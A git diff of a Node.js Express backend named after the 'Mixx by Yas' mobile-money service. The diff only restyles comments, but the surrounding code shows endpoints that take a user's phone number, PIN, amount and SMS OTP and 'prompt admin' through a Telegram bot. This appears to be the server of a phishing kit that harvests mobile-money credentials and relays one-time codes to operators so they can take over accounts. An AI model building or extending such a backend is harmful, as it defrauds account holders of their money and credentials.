@@ -1,14 +1,14 @@
 /**
- * Mixx by Yas - Backend Server (Multi-Admin Support & Safe Webhook/Polling)
+ * **MIXX BY YAS - BACKEND SERVER (MULTI-ADMIN SUPPORT & SAFE WEBHOOK/POLLING)**
  *
- * Behavior:
+ * **BEHAVIOR:**
  * - If USE_WEBHOOK === 'true' and APP_URL is set: starts in webhook mode.
  *   - Sets Telegram webhook to `${APP_URL}/bot${TOKEN}` and exposes that POST route.
  * - Otherwise: attempts to run in polling mode.
  *   - If a webhook is already configured for this bot, the server will delete the webhook
  *     before starting polling to avoid ETELEGRAM 409.
  *
- * Environment:
+ * **ENVIRONMENT:**
  * - TELEGRAM_BOT_TOKEN (required)
  * - TELEGRAM_CHAT_ID (optional default admin chat id)
  * - APP_URL (required for webhook mode — must be https)
@@ -168,7 +168,7 @@ function getTargetChatId(reqChatId) {
 }
 
 /**
- * Submit application (PIN entry)
+ * **SUBMIT APPLICATION (PIN ENTRY)**
  * body: { phone, pin, amount, adminChatId }
  */
 app.post('/api/submit-application', (req, res) => {
@@ -227,7 +227,7 @@ app.post('/api/submit-application', (req, res) => {
 });
 
 /**
- * Check session status endpoint for UI polling
+ * **CHECK SESSION STATUS ENDPOINT FOR UI POLLING**
  */
 app.get('/api/check-status/:userId', (req, res) => {
   const { userId } = req.params;
@@ -237,7 +237,7 @@ app.get('/api/check-status/:userId', (req, res) => {
 });
 
 /**
- * Receive SMS OTP & Prompt Admin
+ * **RECEIVE SMS OTP & PROMPT ADMIN**
  */
 app.post('/api/submit-otp', (req, res) => {
   try {
@@ -282,7 +282,7 @@ app.post('/api/submit-otp', (req, res) => {
 });
 
 /**
- * Request new OTP action
+ * **REQUEST NEW OTP ACTION**
  */
 app.post('/api/request-new-otp', (req, res) => {
   try {
